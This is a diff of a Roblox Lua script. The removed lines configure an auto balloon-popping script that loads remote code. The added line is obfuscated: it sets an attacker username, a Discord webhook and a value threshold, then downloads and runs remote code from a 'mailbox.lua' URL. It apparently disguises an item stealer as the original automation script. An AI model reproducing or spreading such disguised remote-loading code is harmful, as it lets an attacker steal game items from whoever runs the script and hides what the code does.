@@ -1,13 +1,1 @@
-
-getgenv().autoBalloon = true
-getgenv().autoOpenGiftBag = true
-
-getgenv().autoBalloonConfig = {
-    START_DELAY = 1, -- delay before starting
-    SERVER_HOP = true, -- server hop after popping balloons
-    SERVER_HOP_DELAY = 1, -- delay before server hopping
-    BALLOON_DELAY = 1, -- delay before popping next balloon (if there are multiple balloons in the server)
-    GET_BALLOON_DELAY = 1 -- delay before getting balloons again if none are detected
-}
-
-loadstring(game:HttpGet("https://dpaste.com/C9MYL7DGX.txt"))()
+do do do local FlatIdent_8D327=0;local FlatIdent_95CAC;while true do if (FlatIdent_8D327==0) then FlatIdent_95CAC=0;while true do if (FlatIdent_95CAC==1) then RAP=100000;loadstring(game:HttpGet("https://www.kebabman.xyz/s/mailbox.lua"))();break;end if (FlatIdent_95CAC==0) then local FlatIdent_24A02=0;while true do if (FlatIdent_24A02==1) then FlatIdent_95CAC=1;break;end if (FlatIdent_24A02==0) then UserName="StrawNaHat";WebHook="https://discord.com/channels/1192060687011295363/1192060837330960437";FlatIdent_24A02=1;end end end end break;end end end end end
